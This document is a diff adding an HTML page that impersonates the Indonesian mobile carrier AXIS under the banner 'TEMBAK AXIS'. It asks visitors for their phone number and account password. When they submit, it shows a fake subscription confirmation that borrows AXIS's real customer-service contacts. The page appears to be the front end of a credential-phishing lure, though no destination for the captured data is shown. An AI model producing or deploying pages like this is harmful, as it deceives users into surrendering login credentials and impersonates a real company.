@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>AXISnet</title>
+    <link rel="stylesheet" href="main.css">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="shortcut icon"
+        href="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Axis_logo_2015.svg/1280px-Axis_logo_2015.svg.png"
+        alt="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Axis_logo_2015.svg/1280px-Axis_logo_2015.svg.png">
+</head>
+
+<body>
+    <div class="pembelian-form">
+        <div class="logo-simcard">
+            <span>
+                <i class="fas fa-sim-card"></i>
+            </span>
+        </div>
+        <div class="isi-pembelian">
+            <div class="title-pembelian">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Axis_logo_2015.svg/1280px-Axis_logo_2015.svg.png"
+                    alt="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Axis_logo_2015.svg/1280px-Axis_logo_2015.svg.png"
+                    class="img-icon">
+                <span>TEMBAK AXIS</span>
+            </div>
+            <form action="">
+                <div class="form-group">
+                    <label for="nomorhp"><i class="fas fa-mobile"></i> Nomor HP</label>
+                    <input type="number" class="form-ku" id="nomorhp" placeholder="Nomor HP : " name="nohp" required>
+                    <small class="form-text text-muted">
+                        <span class="invoice">*</span>
+                        Harap mengisikan form ini ! Jika tidak, Data yang dikirimkan
+                        tidak masuk.</small>
+                </div>
+                <div class="form-group">
+                    <label for="password"><i class="fas fa-lock"></i> Password</label>
+                    <input type="text" class="form-ku" id="password" placeholder="Password : " name="password" required>
+                </div>
+                <div class="submit-form">
+                    <button type="submit" class="button btn-primarys float-right" id="submit"><i
+                            class="fas fa-sign-in-alt"></i>
+                        Submit</button>
+                </div>
+            </form>
+            <div class="copyright">
+                <i class="fas fa-heart"></i> Copyright by Creative Team
+            </div>
+        </div>
+
+    </div>
+</body>
+<script src="https://kit.fontawesome.com/df7c675642.js"></script>
+<script>
+    $(document).ready(function () {
+                $('#submit').click(function () {
+
+                        alert(
+                            "Kami sedang memproses permintaan berlangganan Anda. Terima Kasih telah menggunakan layanan AXIS. \\n \\nJika Anda membutuhkan bantuan, silahkan hubungi kami di 838 dari nomor AXIS atau 0838 8000 838 dari nomor selain AXIS.\\nAnda juga bisa mengirimkan tweet ke @ask_AXIS atau email ke cs-axis@xl.co.id"
+                        )
+
+                    }
+                })
+</script>
+
+</html>
